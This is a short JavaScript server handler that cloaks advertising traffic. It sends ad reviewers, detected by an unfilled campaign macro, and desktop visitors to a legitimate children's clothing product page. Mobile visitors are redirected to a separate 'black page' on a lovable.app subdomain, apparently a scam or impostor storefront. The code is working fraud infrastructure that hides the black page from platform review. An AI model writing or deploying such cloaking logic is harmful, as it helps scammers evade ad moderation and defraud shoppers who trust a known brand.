export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://us.bonpoint.com/products/tiphany-dress-with-contrasting-croquets?_gl=1*1hkju4d*_up*MQ..*_ga*MTc0NTU2ODE5MS4xNzYxNzc5NjQ5*_ga_KLVWHL2ZC5*czE3NjE3Nzk2NDckbzEkZzAkdDE3NjE3Nzk2NDckajYwJGwwJGg4OTg4OTIxMA";
    const blackPageURL = "https://luvcshap.lovable.app/?";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }






